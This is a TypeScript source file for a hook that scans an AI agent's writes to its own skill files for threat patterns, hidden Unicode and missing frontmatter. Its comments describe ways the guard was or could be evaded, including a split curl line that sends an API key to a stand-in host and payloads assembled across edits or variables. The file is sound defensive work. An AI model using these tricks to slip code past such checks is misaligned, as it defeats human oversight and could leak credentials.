// skillguard.ts — spec 5/23. An agent can write a skill that runs in its NEXT
// session, so a skill file is code the agent grants itself. This is the only
// gate between "the agent wrote it" and "the agent runs it": a PreToolUse hook
// on Write/Edit/MultiEdit that scans content headed for ~/.claude/**.
//
// The regex table is ported verbatim from hermes-agent (see
// skillguard-patterns.ts). It is not rewritten — a retyped table is a new table
// with new gaps.

import fs from 'fs';
import { HookCallback, PreToolUseHookInput } from '@anthropic-ai/claude-agent-sdk';
import { THREAT_PATTERNS, ThreatPattern, Severity } from './skillguard-patterns.js';

export interface Finding {
  patternId: string;
  severity: Severity;
  category: string;
  line: number;
  match: string;
  description: string;
}

export type Verdict = 'safe' | 'caution' | 'dangerous';

// Compiled once. An entry whose regex the JS engine rejects is dropped with a
// warning rather than throwing at import: one bad pattern must not disarm the
// other 119.
const COMPILED = THREAT_PATTERNS.flatMap((p: ThreatPattern) => {
  try {
    return [{ ...p, rx: new RegExp(p.re, 'i') }];
  } catch (err) {
    console.error(`skillguard: pattern ${p.id} failed to compile: ${err}`);
    return [];
  }
});

// U+200B..U+FEFF zero-width, bidi-override and invisible-math characters. Text
// that renders as one thing and means another is how a skill hides an
// instruction from the human reviewing it.
const INVISIBLE_CHARS = new Set([
  '​', '‌', '‍', '⁠', '⁢', '⁣', '⁤',
  '‪', '‫', '‬', '‭', '‮',
  '⁦', '⁧', '⁨', '⁩', '﻿',
]);

// logicalLines joins shell line-continuations before scanning, keeping the
// FIRST physical line's number so a finding still points where an editor shows
// it. A per-line scan alone was evaded by the oldest trick there is:
// `curl \` + newline + `https://x.io?k=$API_KEY` scanned `safe` while the
// single-line form scanned `dangerous`.
//
// This closes the demonstrated evasion, not the class — an author who splits a
// payload across string concatenation or a variable still passes. The guard
// raises cost; it is not a containment boundary.
function logicalLines(text: string): Array<{ text: string; line: number }> {
  const out: Array<{ text: string; line: number }> = [];
  const raw = text.split('\n');
  for (let i = 0; i < raw.length; i++) {
    let joined = raw[i];
    const start = i;
    while (joined.endsWith('\\') && i + 1 < raw.length) {
      joined = joined.slice(0, -1) + ' ' + raw[++i].trimStart();
    }
    out.push({ text: joined, line: start + 1 });
  }
  return out;
}

// scanContent runs the table over one file's text. Line numbers are 1-based so
// they match what an editor shows.
export function scanContent(text: string): Finding[] {
  const findings: Finding[] = [];
  logicalLines(text).forEach(({ text: line, line: lineNo }) => {
    for (const p of COMPILED) {
      const m = p.rx.exec(line);
      if (!m) continue;
      findings.push({
        patternId: p.id,
        severity: p.severity,
        category: p.category,
        line: lineNo,
        match: m[0].slice(0, 120),
        description: p.description,
      });
    }
    for (const ch of line) {
      if (!INVISIBLE_CHARS.has(ch)) continue;
      findings.push({
        patternId: 'invisible_unicode',
        severity: 'high',
        category: 'obfuscation',
        line: lineNo,
        match: `U+${ch.codePointAt(0)!.toString(16).toUpperCase().padStart(4, '0')}`,
        description: 'invisible or bidi-override character in skill text',
      });
      break;
    }
  });
  return findings;
}

const MAX_DESCRIPTION = 1024;

// scalarOf returns a frontmatter key's VALUE, following a YAML block scalar to
// the indented lines that carry it.
//
// `description: >` / `description: |` (with the optional chomping and
// indentation indicators, `>-`, `|+`, `>2`) put the text BELOW the key, so an
// inline capture returns the marker itself. That is one non-empty character:
// a block-scalar description read as present even when the block was empty, and
// its length check measured `>` rather than the prose, so no block-scalar
// description could ever be too long (BUGS J11). One helper for both keys —
// `name:` had the same hole.
function scalarOf(body: string, key: string): string | null {
  const m = new RegExp(`^${key}:[ \\t]*(.*)$`, 'm').exec(body);
  if (!m) return null;
  const inline = m[1].trim();
  if (!/^[|>][+-]?\d*$/.test(inline)) return inline;
  const out: string[] = [];
  // slice starts at the key line's newline, so [0] is that line's empty
  // remainder; the block is the indented run after it.
  for (const line of body.slice(m.index + m[0].length).split('\n').slice(1)) {
    if (line.trim() === '') continue;
    if (!/^[ \t]/.test(line)) break;
    out.push(line.trim());
  }
  return out.join(' ').trim();
}

// validateFrontmatter enforces SKILL.md's contract: `name` and `description`
// are what skill dispatch matches on, so a skill missing either is invisible to
// the agent that wrote it — a silent no-op, not an error it would ever see.
//
// Every finding here is category `structural`, which is what makes it BLOCK
// (see verdictOf): unlike a threat regex, a SKILL.md with no `name:` is broken
// rather than suspicious, so there is no false-positive budget to spend.
export function validateFrontmatter(text: string): Finding[] {
  const findings: Finding[] = [];
  const fm = /^---\n([\s\S]*?)\n---/.exec(text);
  if (!fm) {
    return [{
      patternId: 'frontmatter_missing',
      severity: 'high',
      category: 'structural',
      line: 1,
      match: '',
      description: 'SKILL.md has no --- frontmatter block',
    }];
  }
  const body = fm[1];
  const name = scalarOf(body, 'name');
  const description = scalarOf(body, 'description');
  if (!name) {
    findings.push({
      patternId: 'frontmatter_no_name',
      severity: 'high',
      category: 'structural',
      line: 1,
      match: '',
      description: 'SKILL.md frontmatter has no `name:`',
    });
  }
  if (!description) {
    findings.push({
      patternId: 'frontmatter_no_description',
      severity: 'high',
      category: 'structural',
      line: 1,
      match: '',
      description: 'SKILL.md frontmatter has no `description:` — dispatch matches on it',
    });
  } else if (description.length > MAX_DESCRIPTION) {
    findings.push({
      patternId: 'frontmatter_description_long',
      severity: 'medium',
      category: 'structural',
      line: 1,
      match: `${description.length} chars`,
      description: `description exceeds ${MAX_DESCRIPTION} characters`,
    });
  }
  return findings;
}

// blockingFindings is the set that refuses a write: any `critical` threat
// pattern, plus EVERY structural finding whatever its severity.
//
// The critical-only rule is a false-positive budget for the 120 heuristic
// regexes — `caution` passes because blocking legitimate work is the more
// expensive failure on the agent's own skills. That argument does not reach the
// frontmatter checks, which are deterministic: a SKILL.md with no `name:` is
// invisible to dispatch, not merely suspicious. They were `high` and `medium`,
// so every structural failure passed (BUGS J11).
//
// The hook reports THIS set, not the criticals — reporting criticals alone
// would have denied a structural write with an empty reason.
export function blockingFindings(findings: Finding[]): Finding[] {
  return findings.filter((f) => f.severity === 'critical' || f.category === 'structural');
}

export function verdictOf(findings: Finding[]): Verdict {
  if (findings.length === 0) return 'safe';
  return blockingFindings(findings).length > 0 ? 'dangerous' : 'caution';
}

// isGuardedPath — the hook only governs the agent's own config tree. Everything
// else it writes (its group home, public_html) is data, gated elsewhere.
export function isGuardedPath(p: string): boolean {
  return p.includes('/.claude/');
}

// writtenText pulls the FRAGMENT a Write/Edit/MultiEdit carries. An unknown
// tool shape yields nothing, which fails open by construction.
//
// Scanning this is not sufficient on its own: a safe placeholder written now
// plus an Edit to `$API_KEY` later composes a payload while every fragment
// scanned in isolation is clean (BUGS J9). resultingText is what the hook
// scans; this stays because a fragment is still what an unreadable file
// falls back to.
export function writtenText(toolName: string, input: Record<string, unknown>): string {
  if (toolName === 'Write') return String(input.content ?? '');
  if (toolName === 'Edit') return String(input.new_string ?? '');
  if (toolName === 'MultiEdit') {
    const edits = input.edits;
    if (!Array.isArray(edits)) return '';
    return edits.map((e) => String((e as Record<string, unknown>)?.new_string ?? '')).join('\n');
  }
  return '';
}

// applyEdit mirrors the Edit tool's own replacement so the hook can see the
// file the write WOULD produce. replace_all splits/joins rather than using a
// RegExp — old_string is literal text and may contain regex metacharacters.
function applyEdit(text: string, e: Record<string, unknown>): string {
  const oldS = String(e.old_string ?? '');
  const newS = String(e.new_string ?? '');
  if (oldS === '') return text;
  if (e.replace_all === true) return text.split(oldS).join(newS);
  const i = text.indexOf(oldS);
  return i < 0 ? text : text.slice(0, i) + newS + text.slice(i + oldS.length);
}

// resultingText is the file as it will exist AFTER the write — the only text
// a guard can honestly judge. Write carries it whole; Edit/MultiEdit are
// fragments, so the current file is read and the replacement applied in
// memory, exactly as the tool would.
//
// A file that cannot be read (new file, permissions) falls back to the
// fragment: that is what the old behavior always scanned, so this is never
// weaker than before.
// `whole` reports whether the text IS the resulting file. It gates the
// frontmatter check: validating a fragment as if it were a file reports
// `frontmatter_missing` on every legitimate body edit, which is how this
// function first shipped wrong.
export function resultingText(
  toolName: string,
  input: Record<string, unknown>,
  readFile: (p: string) => string,
): { text: string; whole: boolean } {
  if (toolName === 'Write') return { text: String(input.content ?? ''), whole: true };
  const path = String(input.file_path ?? '');
  let current: string;
  try {
    current = readFile(path);
  } catch {
    return { text: writtenText(toolName, input), whole: false };
  }
  if (toolName === 'Edit') return { text: applyEdit(current, input), whole: true };
  if (toolName === 'MultiEdit') {
    const edits = input.edits;
    if (!Array.isArray(edits)) return { text: current, whole: true };
    return {
      text: edits.reduce<string>(
        (acc, e) => applyEdit(acc, (e ?? {}) as Record<string, unknown>),
        current,
      ),
      whole: true,
    };
  }
  return { text: '', whole: false };
}

function report(path: string, findings: Finding[]): string {
  const lines = findings
    .slice(0, 10)
    .map((f) => `  ${f.severity} ${f.patternId} (line ${f.line}): ${f.description} — ${f.match}`);
  const more = findings.length > 10 ? `\n  …and ${findings.length - 10} more` : '';
  return `skill-guard refused this write to ${path}:\n${lines.join('\n')}${more}\n` +
    'Rewrite without the flagged content, or ask the operator to make the change.';
}

// createSkillGuardHook denies a write whose content scans `dangerous` — any
// critical threat finding, or any structural one. `caution` passes: for a write
// gate on the agent's own skills, blocking legitimate work is the more
// expensive failure, so the false-positive budget is spent only on critical
// patterns. See blockingFindings for why structural is not part of that budget.
//
// A crash in the scanner fails OPEN for the same reason — a guard that bricks
// the agent when it throws is worse than the threat it was added for.
export function createSkillGuardHook(): HookCallback {
  return async (input, _toolUseId, _context) => {
    try {
      const pre = input as PreToolUseHookInput;
      const toolInput = (pre.tool_input ?? {}) as Record<string, unknown>;
      const path = String(toolInput.file_path ?? '');
      if (!path || !isGuardedPath(path)) return {};

      // Frontmatter is a property of the WHOLE FILE. The hook now scans the
      // file the write would PRODUCE rather than the fragment it carries
      // (BUGS J9), so an Edit's outcome carries frontmatter too and is
      // validated like a Write — but only when the resulting file was actually
      // reconstructed. An unreadable file leaves us holding a fragment, and a
      // fragment has no frontmatter to judge.
      const { text, whole } = resultingText(pre.tool_name, toolInput, (p) =>
        fs.readFileSync(p, 'utf-8'),
      );
      const validatesFrontmatter = path.endsWith('SKILL.md') && whole;
      // Empty text used to return here, which skipped validation entirely — so
      // `Write` of an EMPTY SKILL.md, the most complete frontmatter failure
      // there is, sailed through (BUGS J11).
      if (!text && !validatesFrontmatter) return {};

      const findings = scanContent(text);
      if (validatesFrontmatter) findings.push(...validateFrontmatter(text));
      const blocking = blockingFindings(findings);
      if (blocking.length === 0) return {};

      return {
        hookSpecificOutput: {
          hookEventName: 'PreToolUse',
          permissionDecision: 'deny',
          permissionDecisionReason: report(path, blocking),
        },
      };
    } catch (err) {
      console.error(`skillguard: scan failed, allowing write: ${err}`);
      return {};
    }
  };
}
